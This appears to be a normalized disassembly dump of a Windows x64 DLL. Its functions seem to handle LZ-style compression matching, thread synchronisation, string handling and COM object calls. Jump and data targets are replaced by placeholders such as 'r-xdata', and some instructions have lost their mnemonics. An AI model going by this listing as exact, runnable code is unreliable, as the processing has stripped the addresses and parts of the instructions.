mov rcx [ rbx ]
cmp esi r14d
cmova esi r14d
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] r9
mov r9d [ rbx + 0x38 ]
call [ rdi + 0x1f8 ]
add [ r12 + rbp * 4 ] esi
mov ecx r9d
nop [ rax + rax ] eax
test eax eax
jne r-xdata
sub eax r8d
xor eax eax
jmp r-xdata
mov eax [ rdx ]
cmp eax r8d
ja r-xdata
mov [ rdx ] eax
add rdx 0x4
dec rcx
jne r-xdata
sub_180009340
push rbx
push rbp
push rdi
push r14
push r15
sub rsp 0x60
mov eax [ rcx + 0x148 ]
mov r15 rdx
xor edx edx
mov r14d 0x2000
lea ebp [ rdx + 0x2 ]
mov rdi rcx
sub r14d [ rcx + 0x158 ]
mov ebx edx
mov [ rsp + 0x90 ] edx
add r14d r14d
mov [ r15 + 0x4 ] eax
cmp r14d ebp
jbe r-xdata
mov [ r15 ] ebp
add rsp 0x60
pop r15
pop r14
pop rdi
pop rbp
pop rbx
retn
mov [ rsp + 0xa0 ] rsi
mov [ rsp + 0x58 ] r12
mov [ rsp + 0x50 ] r13
nop [ rax + rax ] ax
mov r10d [ rdi + 0x158 ]
mov r12d [ rdi + 0x170 ]
mov r13d [ rdi + 0x160 ]
sub esi eax
mov eax [ rdi + 0x148 ]
cmp r10d eax
cmovae r10d eax
sub eax r10d
mov [ rsp + 0x98 ] r10d
inc eax
cmp eax esi
cmovb esi eax
mov eax [ rdi + 0x174 ]
sub eax r12d
cmp eax esi
cmovb esi eax
cmp ebp r14d
jae r-xdata
lea rcx [ rdi + 0x180 ]
call sub_180008ac0
mov r11d [ rdi + 0x1f0 ]
mov rdx [ rdi + 0x138 ]
dec r11d
and r11d 0x7
shl r11d 0xd
mov r8d r11d
mov [ rdi + 0x140 ] r8d
mov [ rdi + 0x144 ] r8d
mov eax [ rdx + r11 * 4 ]
lea ecx [ r11 + rax ]
mov [ rdi + 0x144 ] ecx
lea ecx [ r11 + 0x1 ]
mov [ rdi + 0x140 ] ecx
mov edx [ rdx + rcx * 4 ]
lea eax [ rcx + 0x1 ]
mov [ rdi + 0x140 ] eax
lea eax [ rbx + rdx ]
mov [ rdi + 0x148 ] edx
mov [ r15 + 0x4 ] eax
mov eax [ rdi + 0x15c ]
cmp [ rdi + 0x148 ] eax
jb r-xdata
mov ecx [ rdi + 0x160 ]
mov eax r13d
mov [ rdi + 0x160 ] r13d
sub eax ecx
sub ecx r13d
add [ rdi + 0x148 ] ecx
add ebx eax
cmp r12d [ rdi + 0x174 ]
cmove r12d edx
mov [ rsp + 0x90 ] ebx
mov [ rdi + 0x170 ] r12d
mov eax esi
dec esi
test eax eax
je r-xdata
cmp [ rdi + 0x148 ] 0x0
movsxd rax ebp
je r-xdata
xor edx edx
jmp r-xdata
mov esi [ rdi + 0x144 ]
mov eax [ rdi + 0x140 ]
cmp eax esi
jne r-xdata
jmp r-xdata
mov ebx [ rsp + 0x90 ]
xor edx edx
mov ecx [ rdi + 0x140 ]
mov r9 [ rdi + 0x168 ]
mov eax ebp
lea rbx [ r15 + rax * 4 ]
mov rax [ rdi + 0x138 ]
mov edx r13d
sub edx [ rax + rcx * 4 ]
lea eax [ rcx + 0x1 ]
mov ecx [ rdi + 0x15c ]
mov [ rdi + 0x140 ] eax
lea rax [ rbx + 0x4 ]
dec ecx
mov [ rsp + 0x48 ] ecx
mov [ rsp + 0x40 ] rax
mov eax [ rdi + 0x178 ]
mov [ rsp + 0x38 ] eax
mov eax [ rdi + 0x174 ]
mov r8d r13d
mov [ rsp + 0x30 ] eax
mov rax [ rdi + 0x150 ]
mov ecx r10d
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rax
call sub_180007d20
mov r10d [ rsp + 0x98 ]
sub rax rbx
inc r12d
sar rax 0x2
inc r13d
lea ecx [ rax - 0x1 ]
add ebp eax
mov [ rbx ] ecx
inc [ rdi + 0x168 ]
cmp ebp r14d
jb r-xdata
mov r12 [ rsp + 0x58 ]
mov rsi [ rsp + 0xa0 ]
mov r13 [ rsp + 0x50 ]
mov [ r15 ] ebp
add rsp 0x60
pop r15
pop r14
pop rdi
pop rbp
pop rbx
retn
lea rax [ r15 + rax * 4 ]
xor ecx ecx
nop [ rax + rax ] ax
cmp ebp r14d
jb r-xdata
mov [ rax ] ecx
dec [ rdi + 0x148 ]
add rax 0x4
inc ebp
cmp [ rdi + 0x148 ] ecx
jne r-xdata
sub_1800095f0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x1b0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x1a0 ] rax
xor esi esi
mov rbx rcx
lea rcx [ rsp + 0x20 ]
mov eax esi
inc eax
inc rcx
cmp eax 0x10
jl r-xdata
nop [ rax + rax ] ax
cmp [ rbx + 0x48 ] esi
jne r-xdata
call [ GetLastError@IAT ]
xor eax eax
mov rcx [ rsp + 0x1a0 ]
xor rcx rsp
call sub_18000c060
lea r11 [ rsp + 0x1b0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
cmp [ rbx + 0x4c ] esi
jne r-xdata
lea rcx [ rbx + 0x180 ]
mov [ rbx + 0xb0 ] edi
call sub_180008b80
mov rcx [ rbx + 0x68 ]
call [ SetEvent@IAT ]
test eax eax
jne r-xdata
mov rcx [ rbx + 0x70 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
cmp [ rbx + 0x184 ] esi
jne r-xdata
mov rcx [ rbx + 0x58 ]
or edx 0xffffffff
mov edi esi
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x60 ]
call [ SetEvent@IAT ]
call [ GetLastError@IAT ]
jmp r-xdata
mov rax [ rbx + 0x8 ]
mov ecx edi
and ecx 0x3f
shl ecx 0xe
lea rdx [ rax + rcx * 4 ]
mov rcx rbx
call sub_180009340
mov edx [ rbx + 0x160 ]
cmp edx 0xffffbfff
jbe r-xdata
lea rcx [ rbx + 0x1c8 ]
call [ EnterCriticalSection@IAT ]
mov [ rbx + 0x1c4 ] 0x1
cmp [ rbx + 0x184 ] esi
jne r-xdata
mov eax [ rbx + 0x174 ]
mov rcx [ rbx + 0x150 ]
sub edx eax
add eax eax
je r-xdata
mov rcx [ rbx + 0x78 ]
xor r8d r8d
inc edi
lea edx [ r8 + 0x1 ]
call [ ReleaseSemaphore@IAT ]
jmp r-xdata
lea rcx [ rbx + 0x1c8 ]
call [ LeaveCriticalSection@IAT ]
mov [ rbx + 0x1c4 ] esi
sub [ rbx + 0x160 ] edx
mov r8d eax
nop [ rax ] eax
test eax eax
jne r-xdata
sub eax edx
mov eax esi
jmp r-xdata
mov eax [ rcx ]
cmp eax edx
ja r-xdata
mov [ rcx ] eax
add rcx 0x4
dec r8
jne r-xdata
sub_180009780
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x30
mov r12 [ rcx + 0x200 ]
lea eax [ r9 * 4 ]
mov edi r9d
mov ebp r8d
mov esi edx
mov rbx rcx
mov [ rcx + 0x2c ] edx
cmp eax 0x4000
jb r-xdata
cmp [ rcx + 0x138 ] 0x0
jne r-xdata
mov eax 0x5
jmp r-xdata
lea r8d [ rbp + 0x110000 ]
mov r9d edi
mov edx esi
mov rcx r12
mov [ rsp + 0x20 ] 0x2111
call sub_180007830
test eax eax
je r-xdata
lea rcx [ rw-data ]
mov edx 0x440000
call [ rw-data ]
mov [ rbx + 0x138 ] rax
test rax rax
jne r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x30
pop r12
retn
mov eax 0x2
jmp r-xdata
lea rdx [ sub_1800095e0 ]
lea rcx [ rbx + 0x180 ]
mov r9d 0x8
mov r8 rbx
call sub_180008d70
mov esi eax
test eax eax
je r-xdata
add rax 0x40000
mov [ rbx + 0x8 ] rax
lea rdi [ rbx + 0x40 ]
lea rdx [ sub_1800095f0 ]
mov r9d 0x40
mov rcx rdi
mov r8 rbx
call sub_180008d70
mov ebx eax
test eax eax
je r-xdata
lea rcx [ rbx + 0x180 ]
call sub_180008c40
mov eax esi
jmp r-xdata
xor eax eax
mov rcx rdi
call sub_180008c40
mov eax ebx
jmp r-xdata
sub_1800098b0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx [ rcx + 0x200 ]
xor esi esi
mov rdi rcx
mov [ rcx + 0x10 ] rsi
mov [ rcx + 0x140 ] rsi
mov rcx rbx
call sub_180007a20
mov r11 [ rbx ]
mov eax [ rdi + 0x2c ]
inc eax
mov [ rdi + 0x1c ] esi
mov rsi [ rsp + 0x38 ]
mov [ rdi + 0x18 ] eax
mov [ rdi ] r11
mov rax [ rbx + 0x28 ]
mov [ rdi + 0x20 ] rax
mov eax [ rbx + 0x7c ]
mov [ rdi + 0x28 ] eax
lea rax [ rbx + 0x8c ]
mov [ rdi + 0x30 ] rax
mov rax [ rbx + 0x30 ]
mov [ rdi + 0x150 ] rax
mov eax [ rbx + 0x20 ]
mov [ rdi + 0x158 ] eax
mov eax [ rbx + 0x60 ]
mov [ rdi + 0x15c ] eax
mov eax [ rbx + 0x8 ]
mov [ rdi + 0x160 ] eax
mov rax [ rbx ]
mov [ rdi + 0x168 ] rax
mov eax [ rbx + 0x18 ]
mov [ rdi + 0x170 ] eax
mov eax [ rbx + 0x1c ]
mov [ rdi + 0x174 ] eax
mov eax [ rbx + 0x3c ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x178 ] eax
add rsp 0x20
pop rdi
retn
sub_180009970
push rbx
sub rsp 0x20
mov rbx rcx
add rcx 0x40
call sub_180008ac0
mov r11d [ rbx + 0xb0 ]
mov r8 [ rbx + 0x8 ]
dec r11d
and r11d 0x3f
shl r11d 0xe
mov edx r11d
mov [ rbx + 0x10 ] edx
mov [ rbx + 0x14 ] edx
mov eax [ r8 + r11 * 4 ]
inc edx
lea ecx [ r11 + rax ]
mov [ rbx + 0x10 ] edx
lea eax [ rdx + 0x1 ]
mov [ rbx + 0x14 ] ecx
mov ecx [ r8 + rdx * 4 ]
mov edx [ rbx + 0x18 ]
mov [ rbx + 0x10 ] eax
mov [ rbx + 0x1c ] ecx
cmp edx 0xffffbfff
jb r-xdata
add rsp 0x20
pop rbx
retn
sub edx [ rbx + 0x2c ]
mov eax [ rbx + 0x28 ]
mov rcx [ rbx + 0x20 ]
dec edx
test eax eax
je r-xdata
mov eax [ rbx + 0x2c ]
inc eax
mov [ rbx + 0x18 ] eax
mov r8d eax
nop [ rax ] eax
sub eax edx
xor eax eax
jmp r-xdata
mov eax [ rcx ]
cmp eax edx
ja r-xdata
mov [ rcx ] eax
add rcx 0x4
dec r8
jne r-xdata
sub_180009a20
push rbx
sub rsp 0x20
mov eax [ rcx + 0x14 ]
mov rbx rcx
cmp [ rcx + 0x10 ] eax
jne r-xdata
mov eax [ rcx + 0x1c ]
add rsp 0x20
pop rbx
retn
call sub_180009970
mov eax [ rbx + 0x1c ]
add rsp 0x20
pop rbx
retn
sub_180009a50
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rdi
mov rdi [ rcx ]
mov rax [ rcx + 0x30 ]
mov r11 [ rcx + 0x20 ]
movzx r9d [ rdi ]
mov ebx [ rcx + 0x18 ]
movzx ecx [ rdi + 0x1 ]
mov r10d [ rax + r9 * 4 ]
xor r10d ecx
and r10d 0x3ff
mov r9d [ r11 + r10 * 4 ]
mov [ r11 + r10 * 4 ] ebx
cmp r9d edx
jb r-xdata
mov rbx [ rsp + 0x8 ]
mov rdi [ rsp + 0x10 ]
mov rax r8
retn
movzx eax [ rdi ]
mov ecx r9d
sub rcx rbx
cmp [ rcx + rdi ] al
jne r-xdata
sub ebx r9d
mov [ r8 ] 0x2
lea rax [ r8 + 0x8 ]
dec ebx
mov [ r8 + 0x4 ] ebx
mov rbx [ rsp + 0x8 ]
mov rdi [ rsp + 0x10 ]
retn
sub_180009ad0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
mov rax [ rcx + 0x30 ]
mov rdi [ rcx ]
mov r11 [ rcx + 0x20 ]
mov ebx [ rcx + 0x18 ]
movzx ecx [ rdi + 0x1 ]
movzx r9d [ rdi ]
mov r10d [ rax + r9 * 4 ]
movzx eax [ rdi + 0x2 ]
shl eax 0x8
xor r10d ecx
xor eax r10d
mov ecx r10d
and ecx 0x3ff
movzx eax ax
mov r10d [ r11 + rcx * 4 ]
add eax 0x400
mov r9d [ r11 + rax * 4 ]
mov [ r11 + rax * 4 ] ebx
mov [ r11 + rcx * 4 ] ebx
cmp r10d edx
jb r-xdata
cmp r9d edx
jb r-xdata
movzx eax [ rdi ]
mov ecx r10d
sub rcx rbx
cmp [ rcx + rdi ] al
jne r-xdata
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
mov rax r8
retn
movzx eax [ rdi ]
mov rcx r9
sub rcx rbx
cmp [ rcx + rdi ] al
jne r-xdata
mov eax ebx
sub eax r10d
dec eax
mov [ r8 + 0x4 ] eax
movzx eax [ rdi + 0x2 ]
cmp [ rcx + rdi + 0x2 ] al
jne r-xdata
sub ebx r9d
mov [ r8 ] 0x3
dec ebx
add r8 0x8
mov [ r8 - 0x4 ] ebx
mov [ r8 ] 0x2
add r8 0x8
mov [ r8 ] 0x3
lea rax [ r8 + 0x8 ]
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
retn
sub_180009bb0
mov r8d [ rcx + 0x10 ]
mov rax [ rcx + 0x8 ]
mov r10 rcx
mov r11d [ rax + r8 * 4 ]
dec [ rcx + 0x1c ]
lea r9 [ rax + r8 * 4 ]
lea eax [ r8 + r11 + 0x1 ]
add r9 0x4
mov [ rcx + 0x10 ] eax
test r11d r11d
je r-xdata
inc [ r10 + 0x18 ]
inc [ r10 ]
mov eax r11d
retn
lea r8d [ r11 - 0x1 ]
shr r8d 0x1
inc r8d
mov eax [ r9 ]
add rdx 0x8
add r9 0x8
dec r8
mov [ rdx - 0x8 ] eax
mov ecx [ r9 - 0x4 ]
mov [ rdx - 0x4 ] ecx
jne r-xdata
sub_180009c10
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov r8d [ rcx + 0x10 ]
mov rax [ rcx + 0x8 ]
mov rbp rdx
mov edi [ rax + r8 * 4 ]
lea rbx [ rax + r8 * 4 ]
mov rsi rcx
lea eax [ r8 + rdi + 0x1 ]
add rbx 0x4
mov [ rcx + 0x10 ] eax
test edi edi
jne r-xdata
mov edx [ rcx + 0x18 ]
dec [ rcx + 0x1c ]
mov r8 rbp
sub edx [ rbx + 0x4 ]
call [ rsi + 0x38 ]
mov r11 rax
nop [ rax + rax ] ax
mov ecx [ rcx + 0x1c ]
lea eax [ rcx - 0x1 ]
mov [ rsi + 0x1c ] eax
cmp ecx 0x4
jb r-xdata
mov eax [ rbx ]
add r11 0x8
add rbx 0x8
add edi 0xfffffffe
mov [ r11 - 0x8 ] eax
mov eax [ rbx - 0x4 ]
mov [ r11 - 0x4 ] eax
jne r-xdata
sub r11 rbp
sar r11 0x2
mov edi r11d
inc [ rsi + 0x18 ]
inc [ rsi ]
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
mov rbp [ rsp + 0x38 ]
mov eax edi
add rsp 0x20
pop rdi
retn
mov edx [ rsi + 0x18 ]
mov r8 rbp
mov rcx rsi
sub edx [ rsi + 0x2c ]
call [ rsi + 0x38 ]
mov rdi rax
sub rdi rbp
sar rdi 0x2
jmp r-xdata
sub_180009ce0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi edx
mov rbx rcx
nop
mov edx [ rbx + 0x10 ]
mov rax [ rbx + 0x8 ]
dec [ rbx + 0x1c ]
inc [ rbx + 0x18 ]
inc [ rbx ]
dec edi
mov ecx [ rax + rdx * 4 ]
lea eax [ rcx + rdx + 0x1 ]
mov [ rbx + 0x10 ] eax
jne r-xdata
lea rcx [ rbx + 0x40 ]
call sub_180008ac0
mov r11d [ rbx + 0xb0 ]
mov r8 [ rbx + 0x8 ]
dec r11d
and r11d 0x3f
shl r11d 0xe
mov edx r11d
mov [ rbx + 0x10 ] edx
mov [ rbx + 0x14 ] edx
mov eax [ r8 + r11 * 4 ]
inc edx
lea ecx [ r11 + rax ]
mov [ rbx + 0x10 ] edx
lea eax [ rdx + 0x1 ]
mov [ rbx + 0x14 ] ecx
mov ecx [ r8 + rdx * 4 ]
mov edx [ rbx + 0x18 ]
mov [ rbx + 0x10 ] eax
mov [ rbx + 0x1c ] ecx
cmp edx 0xffffbfff
jb r-xdata
mov eax [ rbx + 0x14 ]
cmp [ rbx + 0x10 ] eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub edx [ rbx + 0x2c ]
mov eax [ rbx + 0x28 ]
mov rcx [ rbx + 0x20 ]
dec edx
test eax eax
je r-xdata
mov eax [ rbx + 0x2c ]
inc eax
mov [ rbx + 0x18 ] eax
mov r8d eax
nop
sub eax edx
xor eax eax
jmp r-xdata
mov eax [ rcx ]
cmp eax edx
ja r-xdata
mov [ rcx ] eax
add rcx 0x4
dec r8
jne r-xdata
sub_180009db0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi edx
mov rbx rcx
nop
mov ecx [ rbx + 0x1c ]
lea eax [ rcx - 0x1 ]
mov [ rbx + 0x1c ] eax
cmp ecx 0x2
jb r-xdata
lea rcx [ rbx + 0x40 ]
call sub_180008ac0
mov r11d [ rbx + 0xb0 ]
mov r8 [ rbx + 0x8 ]
dec r11d
and r11d 0x3f
shl r11d 0xe
mov edx r11d
mov [ rbx + 0x10 ] edx
mov [ rbx + 0x14 ] edx
mov eax [ r8 + r11 * 4 ]
inc edx
lea ecx [ r11 + rax ]
mov [ rbx + 0x10 ] edx
lea eax [ rdx + 0x1 ]
mov [ rbx + 0x14 ] ecx
mov ecx [ r8 + rdx * 4 ]
mov edx [ rbx + 0x18 ]
mov [ rbx + 0x10 ] eax
mov [ rbx + 0x1c ] ecx
cmp edx 0xffffbfff
jb r-xdata
mov edx [ rbx + 0x10 ]
mov rax [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
dec edi
mov ecx [ rax + rdx * 4 ]
lea eax [ rcx + rdx + 0x1 ]
mov [ rbx + 0x10 ] eax
jne r-xdata
mov rdx [ rbx ]
mov rax [ rbx + 0x30 ]
movzx ecx [ rdx ]
mov r8d [ rax + rcx * 4 ]
movzx eax [ rdx + 0x1 ]
mov rcx [ rbx + 0x20 ]
xor r8 rax
mov eax [ rbx + 0x18 ]
and r8d 0x3ff
mov [ rcx + r8 * 4 ] eax
sub edx [ rbx + 0x2c ]
mov eax [ rbx + 0x28 ]
mov rcx [ rbx + 0x20 ]
dec edx
test eax eax
je r-xdata
mov eax [ rbx + 0x14 ]
cmp [ rbx + 0x10 ] eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x2c ]
inc eax
mov [ rbx + 0x18 ] eax
mov r8d eax
nop
sub eax edx
xor eax eax
jmp r-xdata
mov eax [ rcx ]
cmp eax edx
ja r-xdata
mov [ rcx ] eax
add rcx 0x4
dec r8
jne r-xdata
sub_180009eb0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi edx
mov rbx rcx
nop
mov ecx [ rbx + 0x1c ]
lea eax [ rcx - 0x1 ]
mov [ rbx + 0x1c ] eax
cmp ecx 0x3
jb r-xdata
lea rcx [ rbx + 0x40 ]
call sub_180008ac0
mov r11d [ rbx + 0xb0 ]
mov r8 [ rbx + 0x8 ]
dec r11d
and r11d 0x3f
shl r11d 0xe
mov edx r11d
mov [ rbx + 0x10 ] edx
mov [ rbx + 0x14 ] edx
mov eax [ r8 + r11 * 4 ]
inc edx
lea ecx [ r11 + rax ]
mov [ rbx + 0x10 ] edx
lea eax [ rdx + 0x1 ]
mov [ rbx + 0x14 ] ecx
mov ecx [ r8 + rdx * 4 ]
mov edx [ rbx + 0x18 ]
mov [ rbx + 0x10 ] eax
mov [ rbx + 0x1c ] ecx
cmp edx 0xffffbfff
jb r-xdata
mov edx [ rbx + 0x10 ]
mov rax [ rbx + 0x8 ]
inc [ rbx + 0x18 ]
inc [ rbx ]
dec edi
mov ecx [ rax + rdx * 4 ]
lea eax [ rcx + rdx + 0x1 ]
mov [ rbx + 0x10 ] eax
jne r-xdata
mov r10 [ rbx ]
mov rax [ rbx + 0x30 ]
mov r11 [ rbx + 0x20 ]
movzx edx [ r10 ]
movzx ecx [ r10 + 0x1 ]
mov r8d [ rax + rdx * 4 ]
movzx eax [ r10 + 0x2 ]
mov edx [ rbx + 0x18 ]
shl eax 0x8
xor r8d ecx
xor eax r8d
mov r9d r8d
movzx eax ax
and r9d 0x3ff
add eax 0x400
mov [ r11 + r9 * 4 ] edx
mov [ r11 + rax * 4 ] edx
sub edx [ rbx + 0x2c ]
mov eax [ rbx + 0x28 ]
mov rcx [ rbx + 0x20 ]
dec edx
test eax eax
je r-xdata
mov eax [ rbx + 0x14 ]
cmp [ rbx + 0x10 ] eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov eax [ rbx + 0x2c ]
inc eax
mov [ rbx + 0x18 ] eax
mov r8d eax
nop
sub eax edx
xor eax eax
jmp r-xdata
mov eax [ rcx ]
cmp eax edx
ja r-xdata
mov [ rcx ] eax
add rcx 0x4
dec r8
jne r-xdata
sub_180009fd0
lea rax [ sub_1800098b0 ]
mov [ rdx ] rax
lea rax [ sub_180007660 ]
mov [ rdx + 0x8 ] rax
lea rax [ sub_180009a20 ]
mov [ rdx + 0x10 ] rax
lea rax [ sub_180009a10 ]
mov [ rdx + 0x18 ] rax
lea rax [ sub_180009c10 ]
mov [ rdx + 0x20 ] rax
mov r9 [ rcx + 0x200 ]
mov r8d [ r9 + 0x60 ]
sub r8d 0x2
je r-xdata
lea rax [ sub_180008ed0 ]
mov [ rcx + 0x38 ] 0x0
mov [ rcx + 0x1f8 ] rax
lea rax [ sub_180009ce0 ]
mov [ rdx + 0x28 ] rax
lea rax [ sub_180009bb0 ]
mov [ rdx + 0x20 ] rax
retn
dec r8d
je r-xdata
lea rax [ sub_180008f30 ]
mov [ rcx + 0x1f8 ] rax
lea rax [ sub_180009a50 ]
mov [ rcx + 0x38 ] rax
lea rax [ sub_180009db0 ]
mov [ rdx + 0x28 ] rax
retn
cmp [ r9 + 0x74 ] 0x0
lea rax [ sub_180008fb0 ]
lea r8 [ sub_180009030 ]
cmovne rax r8
mov [ rcx + 0x1f8 ] rax
lea rax [ sub_180009ad0 ]
mov [ rcx + 0x38 ] rax
lea rax [ sub_180009eb0 ]
mov [ rdx + 0x28 ] rax
retn
sub_18000a0b0
push rbx
sub rsp 0x20
mov rbx rcx
xor r9d r9d
xor r8d r8d
xor ecx ecx
xor edx edx
call [ CreateEventA@IAT ]
mov [ rbx ] rax
test rax rax
je r-xdata
call [ GetLastError@IAT ]
mov ecx 0x1
test eax eax
cmovne ecx eax
mov eax ecx
add rsp 0x20
pop rbx
retn
xor eax eax
add rsp 0x20
pop rbx
retn
sub_18000a100
push rbx
sub rsp 0x20
mov rbx rcx
xor r9d r9d
xor ecx ecx
call [ CreateSemaphoreA@IAT ]
mov [ rbx ] rax
test rax rax
je r-xdata
call [ GetLastError@IAT ]
mov ecx 0x1
test eax eax
cmovne ecx eax
mov eax ecx
add rsp 0x20
pop rbx
retn
xor eax eax
add rsp 0x20
pop rbx
retn
sub_18000a140
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor ebx ebx
mov rdi rdx
mov rsi rcx
cmp [ rw-data ] ebx
jbe r-xdata
xor eax eax
lea rbp [ rw-data ]
nop [ rax + rax ] eax
mov eax ebx
imul rax rax 0x190
lea rcx [ rax + rbp + 0x64 ]
sub rdi rcx
nop [ rax + rax ] ax
inc ebx
cmp ebx [ rw-data ]
jb r-xdata
movzx eax [ rcx ]
inc rcx
mov [ rdi + rcx - 0x1 ] al
test al al
jne r-xdata
mov eax 0x1
jmp r-xdata
mov ecx ebx
mov rdx rsi
imul rcx rcx 0x190
add rcx rbp
call sub_1800117c0
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18000a1e0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
call sub_18000bf74
mov r11 rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
or rcx 0xffffffffffffffff
mov [ rax ] 0x0
xor eax eax
[ rdi ]
lea rax [ rw-data ]
mov r8d 0x63
not rcx
mov rdx rbx
lea rdi [ r11 + rcx - 0x1 ]
mov ecx [ rw-data ]
imul rcx rcx 0x190
add rcx rax
call sub_18000be10
mov ecx [ rw-data ]
lea rax [ rw-data ]
imul rcx rcx 0x190
mov r8d 0x12b
mov rdx rdi
add rcx rax
call sub_18000be10
inc [ rw-data ]
sub_18000a270
push rbx
push rbp
push rsi
push rdi
push r12
sub rsp 0x430
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x420 ] rax
mov rbx rcx
mov rbp r8
mov r12 rdx
lea rcx [ rw-data ]
xor edx edx
mov r8d 0xfa0
call sub_18000bd10
lea rcx [ rsp + 0x20 ]
xor edx edx
mov r8d 0x400
mov [ rw-data ] 0x0
call sub_18000bd10
mov rdx r12
mov rcx rbx
call sub_18000bf74
mov rsi rax
test rax rax
je r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi rbx
[ rdi ]
not rcx
dec rcx
cmp ecx 0x400
jae r-xdata
nop [ rax ] eax
mov rcx [ rsp + 0x420 ]
xor rcx rsp
call sub_18000c060
add rsp 0x430
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
test ecx ecx
je r-xdata
xor eax eax
jmp r-xdata
movsxd r8 ecx
lea rcx [ rsp + 0x20 ]
mov rdx rbx
call sub_18000be10
lea rcx [ rsp + 0x20 ]
mov rdx rbp
call sub_18000a1e0
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r12
xor edx edx
mov r8d 0x400
[ rdi ]
not rcx
lea rbx [ rsi + rcx - 0x1 ]
lea rcx [ rsp + 0x20 ]
call sub_18000bd10
mov rdx r12
mov rcx rbx
call sub_18000bf74
mov rsi rax
test rax rax
jne r-xdata
mov eax 0x1
lea rcx [ rsp + 0x20 ]
sub rcx rbx
nop [ rax + rax ] ax
mov ecx esi
sub ecx ebx
cmp ecx 0x400
jae r-xdata
movzx eax [ rbx ]
inc rbx
mov [ rcx + rbx - 0x1 ] al
test al al
jne r-xdata
lea rcx [ rsp + 0x20 ]
mov rdx rbp
call sub_18000a1e0
sub_18000a420
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rbx rcx
lea rcx [ r--data ]
mov rdi rdx
call sub_18000a3c0
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
xor ecx ecx
mov [ rsp + 0x50 ] 0x0
mov [ rw-data ] rax
call [ CoInitialize@IAT ]
mov rcx rbx
call sub_18000a3f0
mov rcx rdi
mov rbx rax
call sub_18000a3f0
mov rdi rax
test rax rax
je r-xdata
test rbx rbx
je r-xdata
xor edx edx
lea rax [ rsp + 0x50 ]
lea r9 [ r--data ]
lea r8d [ rdx + 0x1 ]
lea rcx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ CoCreateInstance@IAT ]
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x10 ]
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x10 ]
mov rax [ rcx ]
mov edx 0x10840014
call [ rax + 0x28 ]
mov rcx [ rsp + 0x50 ]
lea r9 [ r--data ]
mov rax [ rcx ]
mov r8 rdi
mov rdx rbx
mov [ rsp + 0x20 ] 0x0
call [ rax + 0x80 ]
mov rcx [ rsp + 0x50 ]
mov rax [ rcx ]
call [ rax + 0xa8 ]
call [ CoUninitialize@IAT ]
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov rax [ rcx ]
call [ rax + 0x10 ]
sub_18000a530
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0xd0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xc0 ] rax
lea rax [ r--data ]
mov rbx rcx
mov [ rcx + 0x10 ] 0xffffffffffffffff
mov [ rcx ] rax
xor edi edi
mov [ rcx + 0x8 ] rdi
lea rcx [ r--data ]
call [ LoadLibraryA@IAT ]
test rax rax
je r-xdata
mov rax rbx
mov rcx [ rsp + 0xc0 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0xe8 ]
add rsp 0xd0
pop rdi
retn
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
lea rcx [ rsp + 0x24 ]
xor edx edx
mov r8d 0x90
mov [ rbx + 0x8 ] rax
call sub_18000bd10
